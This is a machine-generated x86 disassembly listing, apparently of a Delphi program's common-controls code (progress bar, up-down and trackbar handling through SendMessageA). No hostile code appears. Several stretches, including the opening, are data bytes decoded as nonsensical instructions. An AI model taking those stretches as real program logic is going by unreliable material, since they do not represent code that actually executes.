add [ eax ] al
add [ ecx + 0x61070043 ] al
jbe r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
punpcklwd mm6 [ esi + 0x69 ]
inc esi
imul ebp [ esi + 0x64 ] 0x706d6f43
jne r-xdata
popad
jbe r-xdata
cmp al 0xb1
inc ebx
add al bl
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
dec edi
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070022 ] al
add eax 0x2200043
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
add [ ecx + edx * 8 + 0x41 ] bl
arpl [ gs : ecx + 0x63 ] di
insb
or eax 0x44697661
insb
je r-xdata
imul eax [ ebp + 0x6c ] 0x46657465
dec esi
outsd
insd
jo r-xdata
dec ebp
outsd
jbe r-xdata
add [ edi + ecx * 2 ] cl
outsb
dec esp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060023 ] al
cmovae eax [ eax ]
pushad
add al [ eax ]
add [ edi + edi * 4 ] ch
inc ebx
add [ eax ] cl
fadd [ ecx ]
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x656c6946
inc ecx
add [ edi - 0xe7fffbd ] dl
inc ebx
add [ esp - 0x567ffbc ] cl
inc ebx
add [ eax ] ah
fadd [ ecx ]
or ch dl
imul ebp [ ebp + 0x8 ] 0x436d6f43
je r-xdata
inc esi
inc ecx
add [ eax ] al
aad 0x41
add [ eax ] ch
fadd [ ecx ]
mov al [ 0xffffffffb8004322 ]
push 0x44
add ah al
inc ebx
add [ eax ] ah
outsd
inc esp
add ah dh
out dx eax
inc ebx
add [ eax + 0x65 ] bh
inc esp
add [ eax + 0x78004465 ] bl
bound eax [ eax + eax + 0x3c ]
out dx eax
inc ebx
add [ eax - 0x11 ] al
inc ebx
add [ edi + ebx ] bh
inc esp
add [ eax + 0x1f ] ch
inc esp
add [ eax - 0x47ffbc06 ] al
insb
jae r-xdata
je r-xdata
les esi [ eax + 0xe00043 ]
add bh bh
loopne r-xdata
or esp [ ecx + 0x76 ]
imul eax [ ebx + 0x6f ] 0x69467970
insb
push cs
popad
jbe r-xdata
popad
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x646c6f46
jb r-xdata
shl al 0xd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push cs
inc ebx
add [ edi + ecx ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ah
push cs
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
inc esp
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
call 0xffffffffa4435213
outsd
inc esp
add al bl
aaa
inc esp
rol [ ecx ] 0x1
inc esp
xor eax 0x40100040
insb
inc esi
imul ebp [ ebp + 0xf ] 0x45697661
insd
jo r-xdata
push edx
loop r-xdata
inc ebx
outsd
jo r-xdata
add [ ebp + esi + 0x40 ] al
add [ eax ] dl
or al bl
inc ecx
add [ esi - 0x2ea3ffc0 ] bh
inc ecx
inc ebx
add [ esi ] cl
cmp al 0x35
inc eax
inc esi
imul ebp [ ebp + 0x73 ] 0x6976610b
inc ebx
outsd
jo r-xdata
inc eax
arpl [ gs : ecx + 0x63 ] di
inc esi
imul ebp [ ebp + 0xe ] 0x52697661
sub_430e52
inc ebx
add [ esp + edi * 8 ] cl
inc ebx
add [ ebx + edi * 8 - 0x167ffbd ] al
inc ebx
add [ ebp + edi * 8 + 0x43 ] al
add [ esi + edi + 0x1fec0044 ] ch
inc esp
add [ ebx ] al
inc esp
add al al
arpl [ eax + eax - 0x7c ] ax
pop esi
inc esp
add [ ebx + 0x25040044 ] ah
inc esp
add [ eax + 0x3800442b ] bl
cmp [ eax + eax + 0x20 ] eax
and eax [ ebx ]
and [ esi ] dh
inc esp
add [ eax ] bl
and al 0x43
add al dl
cmp [ eax + eax - 0x2c ] eax
cmp [ eax + eax - 0x74 ] eax
cmp [ eax + eax + 0x3c ] al
and al 0x43
add ah ah
inc esp
add [ edx + eax * 2 + 0x44 ] bh
add [ esi + esi * 2 + 0x44 ] dh
add [ eax ] ch
popad
inc esp
add [ eax + 0x64 ] dl
inc esp
add [ eax ] dl
daa
inc ebx
add [ eax ] dh
daa
inc ebx
add [ eax + 0x27 ] dl
inc ebx
add [ eax + 0x27 ] dh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x2
add [ eax ] al
in al 0x10
inc eax
add [ eax ] dh
add al [ eax ]
add [ edi ] al
add [ ebx - 0x7aff7c00 ] al
add [ 0xd004700 ] al
mov al 0x11
mov ebp sub_4324a4
int3
sub_431280
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_427e44
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_43132c
add esp 0xfffffff0
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x8 ] 0xffff
mov [ esp + 0xc ] 0x0
push esp
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
add esp 0x10
retn
sub_431364
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax 0x20
call sub_431280
mov [ edi + 0x208 ] al
mov ecx esi
xor edx edx
mov eax edi
call sub_4421c4
mov edx 0x96
mov eax edi
call sub_43f46c
push 0x14
call GetSystemMetrics
mov edx eax
mov eax edi
call sub_43f490
xor eax eax
mov [ edi + 0x20c ] eax
mov [ edi + 0x210 ] 0x64
mov [ edi + 0x218 ] 0xa
mov [ edi + 0x21c ] 0x0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4313f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_443324
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443250
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
call InitCommonControls
cmp [ ebx + 0x21d ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x4
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x1
sub_43144a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_443450
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x20c ]
call sub_406c88
push eax
push 0x0
push 0x401
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebx + 0x210 ]
push eax
mov eax [ ebx + 0x20c ]
push eax
push 0x406
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov edx [ ebx + 0x214 ]
mov eax ebx
call sub_431710
pop ebx
retn
sub_4314f0
push ebx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x20c ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x407
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_431528
push ebx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x210 ]
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x407
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
sub_431560
push ebx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x214 ]
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x403
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x408
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
pop ebx
retn
sub_4315b0
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10c ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4316e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi edi
jle r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403238
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
call sub_403a74
cmp esi [ ebx + 0x20c ]
jne r-xdata
test esi esi
jl r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
cmp edi [ ebx + 0x210 ]
je r-xdata
call sub_43132c
cmp esi 0xffff
jg r-xdata
mov [ ebx + 0x20c ] esi
mov [ ebx + 0x210 ] edi
cmp [ ebx + 0x208 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4316ea
lea eax [ ebp - 0x10c ]
call sub_404038
retn
test edi edi
jl r-xdata
mov edx edi
mov eax esi
call sub_406c88
push eax
push 0x0
push 0x401
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
push edi
push esi
push 0x406
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
jmp r-xdata
cmp edi 0xffff
jle r-xdata
push 0x0
push esi
push 0x402
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
cmp esi [ ebx + 0x20c ]
jge r-xdata
sub_431710
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
test esi esi
jl r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
push 0x0
push esi
push 0x402
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop esi
pop ebx
retn
call sub_43132c
cmp esi 0xffff
jle r-xdata
sub_43175c
push ebx
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_4467d4
test al al
je r-xdata
push 0x0
mov eax [ ebx + 0x218 ]
push eax
push 0x404
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_4317e8
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4421c4
push 0x2
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_43f46c
push 0x14
call GetSystemMetrics
mov edx eax
mov eax ebx
call sub_43f490
mov eax [ ebx + 0x4c ]
mov edx eax
sar eax 0x1
jns r-xdata
add esp 0xfffffff0
call sub_40360c
add edx eax
mov eax ebx
call sub_43f490
mov [ ebx + 0x208 ] 0x1
mov [ ebx + 0x21f ] 0x0
mov [ ebx + 0x21c ] 0x0
mov [ ebx + 0x210 ] 0x0
mov [ ebx + 0x212 ] 0x64
mov [ ebx + 0x214 ] 0x1
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x229 ] 0x1
mov [ ebx + 0x21e ] 0x1
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
adc eax 0x0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4318b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x10
call sub_431280
mov edx ebx
mov eax esi
call sub_443324
or [ ebx + 0x4 ] 0x2
cmp [ esi + 0x228 ] 0x1
jne r-xdata
or [ ebx + 0x4 ] 0x8
or [ ebx + 0x4 ] 0x4
jmp r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x40
cmp [ esi + 0x229 ] 0x0
jne r-xdata
cmp [ esi + 0x21e ] 0x0
jne r-xdata
or [ ebx + 0x4 ] 0x20
cmp [ esi + 0x21f ] 0x0
je r-xdata
or [ ebx + 0x4 ] 0x80
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_443250
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
or [ ebx + 0x4 ] 0x1
sub_431948
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x48 ]
mov eax ebx
call sub_443450
mov eax [ ebx + 0x20c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43f46c
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c88
push eax
push 0x0
push 0x467
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebx + 0x214 ]
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
mov edx eax
mov eax ebx
call sub_431e6c
push 0x0
mov eax [ ebx + 0x20c ]
call sub_4464d0
push eax
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_431a20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4034e4
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4034e4
sub_431a78
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_444a84
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4464d0
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_431aa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ edi + 0x4 ] 0x4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ edi + 0x6 ]
mov dx [ ebx + 0x21c ]
cmp ax dx
jle r-xdata
cmp dx ax
jle r-xdata
xor edx edx
mov eax ebx
mov si 0xffb2
call sub_4034e4
jmp r-xdata
mov ax [ edi + 0x6 ]
mov [ ebx + 0x21c ] ax
mov dl 0x1
mov eax ebx
mov si 0xffb2
call sub_4034e4
sub_431b1c
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x1
xor ebx ebx
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x210 ]
jge r-xdata
mov ax [ esi + 0x218 ]
cmp ax [ esi + 0x212 ]
jle r-xdata
cmp [ esi + 0x21a ] 0x0
jl r-xdata
mov ax [ esi + 0x21a ]
test ax ax
jge r-xdata
cmp [ esi + 0x21a ] 0x0
jle r-xdata
xor ebx ebx
jmp r-xdata
test ax ax
jle r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esi + 0x232 ] 0x0
je r-xdata
mov bl 0x1
cmp [ esi + 0x23a ] 0x0
je r-xdata
mov ecx esp
mov edx esi
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
mov ax [ esi + 0x218 ]
push eax
push ebx
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_431bd8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x8 ] 0xfffffd2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov dx [ esi + 0xc ]
mov bp [ esi + 0x10 ]
add dx bp
mov ecx ebp
mov eax edi
call sub_431b00
xor al 0x1
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
sub_431c30
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x1
test edi edi
je r-xdata
xor ebx ebx
mov edx esi
mov eax edi
call sub_40324c
test al al
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403274
mov edi eax
test edi edi
jne r-xdata
sub_431c60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_431e3e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
call sub_4431c8
dec eax
test eax eax
jl r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e45
lea eax [ ebp - 0x18 ]
call sub_404038
retn
mov eax [ esi + 0x30 ]
cmp eax [ ebx + 0x30 ]
jne r-xdata
xor eax eax
mov [ ebx + 0x20c ] eax
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44318c
cmp ebx eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
jne r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44318c
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44318c
cmp esi [ eax + 0x20c ]
jne r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403474
test al al
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_44318c
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
mov eax esi
mov edx [ rw-data ]
call sub_403474
test al al
jne r-xdata
mov eax esi
call sub_403230
mov edx r-xdata
call sub_431c30
test al al
jne r-xdata
mov eax esi
call sub_403230
mov edx r-xdata
call sub_431c30
test al al
jne r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_431e6c
push 0x0
mov eax esi
call sub_4464d0
push eax
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
lea edx [ ebp - 0x18 ]
movsx eax [ ebx + 0x21c ]
call sub_4081d4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_43fce0
sub_431e6c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x40 ]
push 0x0
mov eax ebx
call sub_4464d0
push eax
push 0x469
mov eax ebp
call sub_4464d0
push eax
call SendMessageA
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x40 ]
mov ecx esi
sub ecx eax
mov eax ecx
mov ebp edx
sub ebp edi
lea edx [ eax + esi ]
mov eax ebx
call sub_43f46c
mov edx edi
sub edx ebp
mov eax ebx
call sub_43f420
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431ec0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f180
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x20c ]
jne r-xdata
mov eax edi
call sub_4467d4
test al al
je r-xdata
push 0x0
push 0x0
push 0x469
mov eax edi
call sub_4464d0
push eax
call SendMessageA
xor eax eax
mov [ edi + 0x20c ] eax
sub_431f10
push ebx
mov ebx eax
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov ax [ ebx + 0x21c ]
pop ebx
retn
push 0x0
push 0x0
push 0x468
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov [ ebx + 0x21c ] ax
pop ebx
retn
sub_431f48
push ebx
mov ebx eax
cmp dx [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dx
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_431f90
push ebx
mov ebx eax
cmp dx [ ebx + 0x212 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x212 ] dx
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov dx [ ebx + 0x210 ]
mov ax [ ebx + 0x212 ]
call sub_406c88
push eax
push 0x0
push 0x465
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_431fd8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x214 ]
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax esp
push eax
push 0x1
push 0x46c
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov [ esp + 0x4 ] esi
mov eax esp
push eax
push 0x1
push 0x46b
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_432034
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432100
push [ fs : eax ]
mov [ fs : eax ] esp
mov di [ ebx + 0x21c ]
cmp si di
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432107
lea eax [ ebp - 0x4 ]
call sub_404038
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov [ ebx + 0x21c ] si
test [ ebx + 0x1c ] 0x10
je r-xdata
mov ecx esi
sub cx di
mov edx esi
mov eax ebx
call sub_431b00
test al al
je r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
xor edx edx
mov ax [ ebx + 0x21c ]
call sub_406c88
push eax
push 0x0
push 0x467
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
mov esi [ ebx + 0x20c ]
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x21c ]
call sub_4081d4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43fce0
sub_432110
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x229 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x229 ] dl
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_443a38
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_432184
push ebx
mov ebx eax
cmp dl [ ebx + 0x228 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x228 ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_443a38
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_4321c0
push ebx
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x208 ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_443a38
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_4321fc
push ebx
mov ebx eax
cmp dl [ ebx + 0x21e ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21e ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_443a38
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_432238
push ebx
mov ebx eax
cmp dl [ ebx + 0x21f ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x21f ] dl
mov eax ebx
call sub_4467d4
test al al
je r-xdata
mov eax ebx
call sub_443a38
push 0x0
push 0x0
push 0x469
mov eax ebx
call sub_4464d0
push eax
call SendMessageA
sub_432278
push cs
push cs
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x61506574
jb r-xdata
pop esp
insd
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
push ebx
push esi
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x238 ] 0x1
mov [ esi + 0x236 ] 0x1
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4421c4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x64
mov eax esi
call sub_43f46c
mov edx 0x50
mov eax esi
call sub_43f490
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
add esp 0xfffffff0
call sub_40360c
sub_432320
push ebx
push esi
add esp 0xfffffee8
mov esi edx
mov ebx eax
mov eax 0x80
call sub_431280
mov edx esi
mov eax ebx
call sub_443324
call sub_4312f4
cmp eax 0x40047
jge r-xdata
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_443250
mov eax [ esi + 0x4 ]
xor edx edx
mov dl [ ebx + 0x210 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x235 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x236 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
and [ esi + 0x24 ] 0xfffffffc
call sub_4312f4
cmp eax 0x40047
jge r-xdata
mov eax ebx
call sub_432834
mov [ esi + 0x34 ] eax
add esp 0x118
pop esi
pop ebx
retn
push 0x2
lea edx [ esp + 0x1c ]
mov eax [ ebx ]
call sub_403238
lea eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x4
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x4 ]
mov edx r-xdata
lea eax [ esi + 0x4c ]
call sub_408e98
sub_432415
add [ eax ] al
add [ ebx - 0x75 ] dl
fadd st6
and [ ecx ] 0x2
add [ eax ] al
add dh al
and [ eax ] 0x2
add [ eax ] al
add [ ebx + 0x1020e8c3 ] cl
add [ eax ] eax
mov eax ebx
call sub_432474
pop ebx
retn
sub_43243c
push ebx
push esi
push ecx
mov esi eax
mov bl [ esi + 0x208 ]
mov al [ esi + 0x220 ]
mov [ esp ] al
xor edx edx
mov eax esi
call sub_432be8
mov eax esi
call sub_443834
mov al [ esp ]
mov [ esi + 0x220 ] al
mov [ esi + 0x208 ] bl
pop edx
pop esi
pop ebx
retn
sub_432474
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_432be8
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
mov dl 0x1
mov eax ebx
call sub_432a08
sub_4324a4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_447234
pop esi
pop ebx
retn
